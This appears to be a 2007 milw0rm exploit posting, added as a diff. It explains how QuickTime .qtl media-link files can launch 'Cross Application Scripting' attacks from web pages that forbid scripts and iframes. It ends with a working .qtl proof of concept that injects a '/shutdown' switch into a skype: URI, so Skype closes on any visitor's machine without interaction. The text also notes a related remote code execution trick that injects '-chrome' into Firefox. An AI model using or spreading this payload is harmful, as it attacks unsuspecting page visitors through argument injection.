@@ -1,0 +1,26 @@
+<!--
+Performing XAS (Cross Application Scripting) attacks automatically (read "no user interaction") 
+is very easy, as I showed before in my "shutting down skype" proof-of-concept.
+
+But, what if you are using a limited web environment, where you can't use iframes or scripts to 
+automate your pwning? Several limited web environments (e.g. blogger.com blog system) does not 
+allow using iframes or script, but they do allow embedding QuickTime movies.
+
+Few days ago, pdp found that it is possible to use QuickTime .qtl files to execute code from 
+remote, when the default browser is Firefox. This is a variant of the good old MOAB #3 and 
+pdp's own MP3 backdooring exploit. It uses a simple "-chrome" command-line switch injection.
+
+As this is a Firefox only exploit, I looked for ways to do the same in Internet Explorer. 
+I found that it is also possible to perform all other noted XAS attacks using QuickTime.
+
+So now, if you are in a limited web environment, you can just embed a .qtl file and conduct 
+an automated XAS attack against the visitor of the web page.
+
+The following is the QuickTime .qtl version of the "shutting down skype" PoC:
+-->
+ 
+<?xml version="1.0">
+<?quicktime type="application/x-quicktime-media-link"?>
+<embed src="nothing.mp3" autoplay="true" qtnext="skype:&quot; /shutdown"/>
+
+# milw0rm.com [2007-09-18]
